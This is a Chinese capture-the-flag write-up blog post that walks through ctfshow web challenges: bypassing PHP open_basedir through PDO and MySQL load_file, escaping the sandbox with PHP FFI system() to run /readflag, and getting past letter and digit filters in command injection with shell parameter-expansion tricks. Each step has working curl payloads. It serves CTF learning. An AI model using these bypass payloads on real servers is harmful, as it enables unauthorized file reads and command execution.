也就是说，PDO是一个中介，一个通用语言，可以这么理解，那么这道题我们猜测，mysqld 有没有功能能让我们读这个文件呢？如果可以的话，它的进程是 PHP 的open_basedir管不到的，接下来如果可以打通，那我们要做的就是：验证可通 -> 读取

如何验证可通？
```bash
curl --data-urlencode "c=new PDO('mysql:host=localhost;dbname=information_schema','root','root');echo 'ok';exit();" "https://.../"
```
`new PDO(...)` 是实例化 PDO 类，然后 PDO 吃三个参数，分别是 DSN（数据源名称）、用户名、密码，如果连上了就 `echo 'ok'`
DSN三段是
```
mysql:host=localhost;dbname=information_schema
└─┬──┘ └──────┬─────┘ └──────────┬──────────┘
 驱动名      主机地址            初始数据库
```
至于为什么选 `information_schema` ，是因为它是 MySQL 的系统库，每个实例都有，是默认库。账号密码在这里就比较简单了，当然真实的靶场肯定没那么简单。

既然连上了，那我们就着手用 PDO 里的工具去读一下 flag

```php
try {
    $dbh = new PDO('mysql:host=localhost;dbname=information_schema', 'root', 'root');
    foreach ($dbh->query("select load_file('/flag36.txt')") as $row) {
        echo $row[0], '|';
    }
    $dbh = null;
} catch (PDOException $e) {   // 报错了输出报错信息
    echo $e->getMessage();
    die();
}
exit();

```
`$dbh = new ...` 是连接数据库 ， `$dbh->query("select load_file('/flag36.txt')")` 把这条 SQL 发给 `mysqld` (mysql后台) ，`load_file()` 是MySQL 的内置函数，读的是数据库服务器所在机器上的文件，返回文件内容，最后在 MySQL 上执行的语句就是 `load_file('/flag36.txt')`

为什么可以绕过 open_basedir是因为流程是
```
PHP 进程 ──SQL──▶ mysqld 进程 ──read──▶ /flag36.txt
   ↑ open_basedir 管这里          ↑ 真正读文件的是它
```

最后无论你是保存文件执行还是直接打都可以，一发就穿

写的我力竭了...


### pt.5.8 FFI sandbox 逃逸

虽然源码应该是和上题是一样的，但是这道题并不是 SQL 的调用，而是 C 函数（用C语言写的、已经编译好的函数）的调用
>其实本质上 PHP 就是 C语言写的

不过在我们发现这道题是FFI 之前，我们先来探查一下
```bash
curl --data-urlencode "c=foreach(new DirectoryIterator('glob:///*') as $f){echo $f->getFilename(),' ';}exit;" "https://.../"
bin boot dev etc flag36x.txt home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var
```

发现了 `flag36x.txt` ，include看看
```bash
<b>Warning</b>:  include(): open_basedir restriction in effect. File(/flag36x.txt) is not within the allowed path(s): (/var/www/html/) in <b>/var/www/html/index.php(19) : eval()'d code</b> on line <b>1</b><br />
```
依旧沙箱....怎么这么多沙箱？！

还有那里有一个 `readflag` ！我们是不是最后通过 readflag来读取 flag36x.txt 的呢？

我们按照之前的方法，试图利用SQL 来读取，发现并不可以，而之前的 UAF 也是被黑名单了，那么这道题肯定有它的方法，我们先看看版本
```bash
curl --data-urlencode "c=echo PHP_VERSION;exit(0);" "https://.../"
7.4.9
```
再看看拓展
```bash
curl --data-urlencode "c=echo implode(' ',get_loaded_extensions());exit(0);" "https://..../"
Core date libxml openssl pcre sqlite3 zlib ctype curl dom fileinfo filter ftp hash iconv json mbstring SPL PDO session posix Reflection standard SimpleXML pdo_sqlite Phar tokenizer xml xmlreader xmlwriter mysqlnd apache2handler FFI sodium
```
相较于之前的 PDO ，这里多了一个 FFI ，我们推测这个 FFI 就是这道题的解题关键

那我们首先要来了解一下什么是 FFI 。
>FFI 是 Foreign Function Interface，在 PHP 里直接调用 C 函数，它可以向 PHP 声明一个 C 函数的签名 (int system(const char \*command);) ，之后可以以 C 库的身份调用 system 函数

那接下来我们先来检查一下 FFI 到底可不可以调用
```bash
curl --data-urlencode "c=echo ini_get('ffi.enable');exit(0);" "https://.../"
1
```
返回了 `1` ，说明是可以调用的

接下来我们就要往c里面写payload
```php
$ffi = FFI::cdef('int system(const char *command);');
$ffi->system('/readflag > 1.txt');
```
这里可能会有些看不懂，我们逐句解读一下

先看里面的函数声明：
```text
int  system ( const char *command ) ;
 │     │            │        │
 │     │            │        └─ 参数名（可以随便叫）
 │     │            └────────── 参数类型：指向字符的指针
 │     └─────────────────────── 函数名
 └───────────────────────────── 返回值类型
```
逻辑就是将获得的 PHP 字符串 转换成 C 的 char *

其中的 `cdef` 是**声明 C签名**；告诉 PHP 参数和返回值的传输方式
`/readflag` 为什么不是 `cat` ？我们反编译一下这个函数
```c
int main(int argc, const char **argv, const char **envp)
{
  setuid(0);                     // 把有效用户切成 root
  puts("ctfshow flag getter");
  system("cat /flag36x.txt");    // 以 root 身份读 flag
  return 0;
}
```
这是因为这道题的flag我们读取是需要 root 权限的，而这个 `readflag` 程序里面，自动就包含了以 root 的权限来 `cat flag` ，

然后后面的 `> 1.txt` ，为什么要重定向到 1.txt 呢？
因为：1. FFI 调用的 system 在页面上面看不到。2. flag文件本身只能是 root-only，我们的用户权限cat 会被拒绝。
而我们重定向的 `1.txt` 本身并不存在，当它不存在的时候，会在当前的工作目录下面（在这里就是/var/www/html/ ）创建一个文件，重定向是 shell 做的，不受沙箱约束，1.txt 按相对路径放在了当前的工作目录，也就是说恰好我们可以在沙箱里面读到这个 1.txt

最后到了激动人心的发payload环节
```bash
curl --data-urlencode "c=$ffi=FFI::cdef('int system(const char *command);');$ffi->system('/readflag > 1.txt');" "https://.../"

curl --data-urlencode "c=include('1.txt');exit(0);" "https://.../"
```
就可以了！！！

总结一下，对于沙箱我们的绕过方法有很多种，但是具体在实际绕过的时候需要看靶机给我们ban了什么函数，给了我们什么拓展....

**you are ctfshow flag getter**


### pt.6.1

接下来是最后一部分的命令执行
给了我们一个输入框，我们来看看我们可以干什么，首先我们先看看它的源码
```html
<!DOCTYPE html>
<html lang="zh-cn">
<head>
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="style.css">
</head>
<body>

<div style="width:400px;height:10px;margin:100px auto">
<form action='' method=post>
<input type='text' name='code' placeholder="给你打开一扇通往结界的窗户，可惜钥匙你是找不到的 ">
</form>
<!-- system($code);-->
</div>
</body>
</html>
```

在这里我们可以看到很多信息，首先这个表单是以 `POST` 形式发送的，然后表头是 code，虽然这道题我们可以用 hackbar（其实之前的题目都可以用hackbar，但是这边为了便于显示在博客上，我们还是用 curl 来）

我们发送
```bash
curl --data-urlencode "code=123" "http://.../"
```
但是回显是
```html
<div align="center">evil input</div>
```
非法输入是说。

于是我们猜测，这道题存在着字符黑名单，我们一个个试过去，看看到底什么类型的字符会被ban，最后我们发现了小写字母（不含大写字母）和数字被ban了，那么这道题又是一个新的知识点
 
>`${#PATH}` 这样的用 `${# }` 括起来的作用相当于取 PATH 的长度，而 `${PATH}` 则是用 `${ }` 得到PATH的值（比如一般来说是 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin）。当然， `${ }` 还有一个方式是它可以拥有类似数组的作用， `${A:x:y}` 则是在 A 字段中偏移 x 个字段（注意和数组一样，第一个字符是 0 ！别记错了！）作为开头，然后取 y 个字段长。当然也可以 `${A: -1}`（注意有一个空格） 或者等价式 `${A:~A}` 来取最后一个字符，总之方法很多

而一般来说的 PATH HOME SHLVL 这些都是默认的，不过这里还是要注意以下我们是可以调用 RANDOM（RANDOM默认是0-32767） 来随机取字符长度，不过一般来说大概率是千位或者万位，所以 RANDOM 基本上是 4 或者 5


下面是一些常用的名字以及长度，但是注意了！路径全名是不包含 `#` 的。 `#` 是取长度的意思，千万不要弄混了。
当然如果可以的话，要打什么命令来拿到名字里的信息呢？
我们可以直接比如 `echo $HOME` 来解决

| 名字            | 值                                                               |
| ------------- | --------------------------------------------------------------- |
| `${#RANDOM}`  | 4 或 5                                                           |
| `${#HOME}`    | 默认 /home/www-data，长度 14                                         |
| `${#SHLVL}`   | 默认 1                                                            |
| `${#PATH}`    | 默认 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin |
| `${#PWD}`     | 默认 /var/www/html，长度 13                                          |
| `${#USER}`    | 默认 www-data，长度 8                                                |
| `${#LOGNAME}` | 同 USER，长度 8                                                     |
| `${#SHELL}`   | 默认 /bin/sh，长度 7                                                 |
| `${#BASH}`    | 默认 /usr/bin/bash，长度 13                                          |
| `${#UID}`     | Debian 是 33、Alpine 是 82，长度 2                                    |
| `${#PPID}`    | 父进程 PID，位数不定                                                    |
| `${#SECONDS}` | shell 已运行秒数，位数不定                                                |
| `${#0}`       | `$0` 是 shell 名（sh 或 /bin/sh），长度 2 或 7                           |
| **${#IFS}**   | 它是由空格+\t+\n组成的，长度 3                                             |

有了这些，我们构造出个 `nl ?l??.???` 还不简单？
最后payload
```bash
curl --data-urlencode "code=${PATH:~A}${PWD:~A} ?${PWD:~A}??.???" "https://.../"
```


### pt.6.2

这道题在原有基础上 ban 了 PATH 和 BASH，也就是说我们没办法用 nl 了，但是我们还可以用 cat 
但是 cat 这个命令也太长了...

不过我们要知道
> /bin 是 binaries 也就是二进制程序的缩写，里面放着系统的基础命令，当然会包含了常见的cat，nl这样的命令，所以我们只要写 /bin/cat /bin/nl 就行了

当然我们这么做也是需要运气的，因为实例中 三字符的不止 bin 一个，还有可能有别的，而通配符会找出所有满足的答案，而虽然我们的 bin 因为字符 `b` 在26个字母的较前面的位置，基本上都会以它作为命令的，但是如果找到了多个路径，shell就会把他们全都展开，比如 /bin/cat  /etc/net flag.php 后面的etc就会被当作参数...所以这道题能这么做也是靠一些运气的吧。

```bash
curl --data-urlencode "code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???" "https:///.../"
```


### pt.6.3

其实后一道题就亮出了源码了
```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
if(isset($_POST['code'])){    $code=$_POST['code'];  
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){      
        if(strlen($code)>65){  
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';  
        }  
        else{  
        echo '<div align="center">'.system($code).'</div>';  
        }  
    }  
    else{  
     echo '<div align="center">evil input</div>';  
    }  
}  
?>
```
那这题我们也不多说了也是可以直接过的，唯一的区别就在于，你的code长度要小于65，最后的payload

```bash
curl --data-urlencode "code=${PWD::${#?}}???${PWD::${#?}}??${USER:~${#?}:${#?}} ????.???" "https://.../"
```
这里可能会有些疑惑就是这个 `${#?}` 里的`?`的长度为什么是 1 ？好像没有为什么，shell 刚启动的时候 $? = 0，长度就是 1


## 总之...

总之就先写到这里吧，真的写了我一个星期了，虽然最后还有一道RCE的题但是真的累了我之后再补上吧，也算是一个小小的总结了这个，希望对大家有帮助吧

<blockquote style="text-align:right">Cola_CaO From HZNU<br>2026.11.08</blockquote>